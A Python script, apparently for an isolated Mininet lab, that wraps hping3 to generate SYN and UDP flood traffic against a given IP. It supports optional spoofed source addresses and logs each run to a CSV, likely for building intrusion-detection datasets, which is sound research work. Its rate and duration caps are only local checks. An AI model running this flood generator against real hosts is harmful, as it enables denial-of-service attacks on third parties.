#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bounded SYN/UDP load generator for the isolated Mininet lab only.
Requires an explicit lab target, a finite duration and a capped packet rate.
"""
from __future__ import annotations
import argparse, csv, signal, subprocess, time
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
MAX_DURATION_S = 300
MAX_RATE_PPS = 20000


def build_command(kind: str, rate_pps: int, target: str, port: int,
                  spoof: bool, payload_bytes: int) -> list[str]:
    interval_us = max(1, round(1_000_000 / rate_pps))
    cmd = ["hping3"]
    if kind == "syn_flood": cmd += ["-S", "-p", str(port)]
    elif kind == "udp_flood": cmd += ["--udp", "-p", str(port), "-d", str(payload_bytes)]
    else: raise ValueError("unsupported attack type")
    cmd += ["-i", f"u{interval_us}"]
    if spoof: cmd.append("--rand-source")
    cmd.append(target)
    return cmd


def append_event(path: Path, row: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    fields = ["episode", "start_utc", "end_utc", "duration_actual_s", "attack_type",
              "target", "port", "configured_rate_pps", "spoof", "hping_packets_tx", "return_code"]
    new = not path.exists()
    with path.open("a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        if new: w.writeheader()
        w.writerow({k: row.get(k) for k in fields})


def run(args) -> None:
    if not 1 <= args.rate <= MAX_RATE_PPS: raise ValueError(f"rate must be 1..{MAX_RATE_PPS} pps")
    if not 1 <= args.duration <= MAX_DURATION_S: raise ValueError(f"duration must be 1..{MAX_DURATION_S} s")
    if not 1 <= args.port <= 65535 or not 0 <= args.payload_bytes <= 1400: raise ValueError("invalid port/payload")
    if args.spoof and not args.allow_spoof: raise ValueError("source spoofing is disabled by default; add --allow-spoof only in the isolated lab")
    cmd = build_command(args.type, args.rate, args.target, args.port, args.spoof, args.payload_bytes)
    print(f"[ATTACK] {' '.join(cmd)}; max_duration={args.duration}s", flush=True)
    start_utc = datetime.now(timezone.utc).isoformat(); t0 = time.monotonic()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, start_new_session=True)
    output = ""
    try:
        try: output, _ = proc.communicate(timeout=args.duration)
        except subprocess.TimeoutExpired:
            proc.send_signal(signal.SIGINT)
            try: output, _ = proc.communicate(timeout=3)
            except subprocess.TimeoutExpired:
                proc.terminate()
                try: output, _ = proc.communicate(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill(); output, _ = proc.communicate()
    except KeyboardInterrupt:
        proc.send_signal(signal.SIGINT)
        try: output, _ = proc.communicate(timeout=3)
        except subprocess.TimeoutExpired: proc.kill(); output, _ = proc.communicate()
    actual = time.monotonic() - t0
    # hping3 prints e.g. "100 packets transmitted" when interrupted cleanly.
    import re
    m = re.search(r"(\d+) packets transmitted", output or "")
    tx = int(m.group(1)) if m else None
    append_event(args.events_file, {"episode": args.episode, "start_utc": start_utc,
        "end_utc": datetime.now(timezone.utc).isoformat(), "duration_actual_s": round(actual, 4),
        "attack_type": args.type, "target": args.target, "port": args.port,
        "configured_rate_pps": args.rate, "spoof": args.spoof, "hping_packets_tx": tx,
        "return_code": proc.returncode})
    print(f"[ATTACK] stopped after {actual:.2f}s; hping_tx={tx}; events={args.events_file}", flush=True)


def main() -> None:
    ap = argparse.ArgumentParser(description="Rate-limited attack traffic for an isolated Mininet lab")
    ap.add_argument("--type", choices=["syn_flood", "udp_flood"], required=True)
    ap.add_argument("--rate", type=int, default=500)
    ap.add_argument("--duration", type=int, default=15)
    ap.add_argument("--target", required=True, help="explicit target IP inside the lab")
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--payload-bytes", type=int, default=1400)
    ap.add_argument("--spoof", action="store_true")
    ap.add_argument("--allow-spoof", action="store_true", help="explicit opt-in for isolated namespace experiments")
    ap.add_argument("--episode", default="manual")
    ap.add_argument("--events-file", type=Path, default=HERE / "results" / "attack_events.csv")
    run(ap.parse_args())

if __name__ == "__main__": main()
